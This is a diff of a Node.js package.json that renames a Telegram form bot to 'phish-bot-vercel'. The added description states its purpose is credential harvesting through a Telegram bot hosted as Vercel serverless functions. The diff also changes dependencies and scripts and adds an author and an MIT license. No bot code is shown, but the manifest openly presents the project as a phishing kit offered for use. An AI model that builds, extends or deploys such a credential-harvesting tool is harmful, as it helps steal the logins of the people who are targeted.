@@ -1,13 +1,21 @@
 {
-  "name": "telegram-form-bot",
+  "name": "phish-bot-vercel",
   "version": "1.0.0",
+  "description": "A Telegram bot for credential harvesting hosted on Vercel as serverless functions.",
   "main": "api/bot.js",
   "scripts": {
-    "start": "node api/bot.js"
+    "start": "vercel dev",
+    "dev": "vercel dev"
   },
   "dependencies": {
-    "express": "^4.18.2",
-    "telegraf": "^4.15.0",
-    "body-parser": "^1.20.2"
-  }
+    "telegraf": "^4.16.0",
+    "micro": "^9.4.1",
+    "micro-body": "^6.0.0"
+  },
+  "devDependencies": {},
+  "engines": {
+    "node": "18.x"
+  },
+  "author": "Tejas-Turbo",
+  "license": "MIT"
 }
